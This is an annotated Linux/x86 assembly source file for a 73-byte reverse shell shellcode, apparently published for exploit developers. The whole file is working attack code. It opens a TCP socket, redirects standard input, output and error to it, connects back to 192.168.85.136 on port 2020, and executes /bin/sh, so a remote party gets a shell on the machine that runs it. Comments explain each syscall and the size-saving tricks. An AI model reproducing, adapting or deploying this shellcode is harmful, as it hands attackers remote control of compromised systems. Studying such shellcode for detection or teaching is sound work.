; Title: Linux/x86 Reverse Shell code - 73 bytes
; Author: Zsolt Agoston (agzsolt)

global _start           
 
section .text
 
_start:

;create socket 
;in /usr/include/i386-linux-gnu/asm/unistd_32.h searching for socket gives back syscall 102 (#define __NR_socketcall 102), in hex it is 0x66
;int socket(int domain, int type, int protocol) ==> socket(AF_INET, SOCK_STREAM, 0) ==> socket(2,1,0)
;AF_INET = 2  ( /usr/include/i386-linux-gnu/bits/socket.h)
;SOCK_STREAM = 1 (/usr/include/i386-linux-gnu/bits/socket_type.h)
; eax=0x66, ebx=0x01, stack has the socket args: 2,1,0
     
xor edx, edx	        ; zero out edx
push 0x66               ; move socket syscall to eax
pop eax
push edx                ; protocol=0
inc edx
push edx                ; sock_stream=1
mov ebx, edx            ; ebx=1
inc edx
push edx                ; AF_INET=2
mov ecx, esp            ; save the pointer to args in ecx register
int 0x80                ; call socketcall()

mov ebx, eax            ; store socket file descriptor in ebx    

;redirect stdin, stdout, stderr
;int dup2(int oldfd, int newfd);
;dup2(clientfd, 0); // stdin
;dup2(clientfd, 1); // stdout
;dup2(clientfd, 2); // stderr
; eax=0x3f, ebx=clientfd, ecx= (with the loop, it's 2-1-0 to redirect all 3 file descriptors)

mov ecx, edx            ; loop counter=2, making 3 loops, we use edx which already is edx=0x02

stdloop:
        mov al, 0x3f    
        int 0x80
	dec ecx
        jns stdloop

;connect(sock_file_des,(struct sockaddr *) &sock_ad,sizeof(sock_ad));
;sock_ad.sin_family = AF_INET; 
;sock_ad.sin_port = htons(2020);
;sock_ad.sin_addr.s_addr = inet_addr("192.168.85.136");
;connect=3
; eax=0x66, ebx=3, ecx=args (sockfd, struct, lenght of struct (8+8byte), the struct itself[AF_INET, port, ip address])

xchg ebx, edx           ; before xchg edx=2 and ebx=sock_file_des and after xchg ebx=2, edx=sock_file_des
push 0x8855a8c0         ; sock_ad.sin_addr.s_addr = inet_addr("192.168.85.136");
push word 0xe407        ; sock_ad.sin_port = htons(2020);
push word bx            ; sock_ad.sin_family = AF_INET=2;
mov ecx, esp            ; pointer to struct
	 
mov al, 0x66            ; socket call (0x66)
inc ebx                 ; connect(3)
push 0x10               ; sizeof(struct sockaddr_in)
push ecx                ; struct
push edx                ; sockfd
mov ecx, esp            ; save the pointer to args in ecx register
int 0x80  
          
;execute shell (here we use /bin/sh) using execve call
;execve("//bin/sh",["//bin/sh"])
; eax=0x0b, ebx=(pointer to the kernel instruction), ecx=0, edx=0
	
mov al, 0x0b	        ; execve system call 
cdq			; this trick uses the cdq command, which extends the eax register into edx in case the SF flag is set
                        ; (negative value of eax), which is not the case so it zeros out edx, this way we can save an extra byte
mov ecx, edx		; zero out ecx
push edx                ; push null
push 0x68732f6e         ; hs/n
push 0x69622f2f         ; ib//
mov ebx,esp             ; save pointer
int 0x80
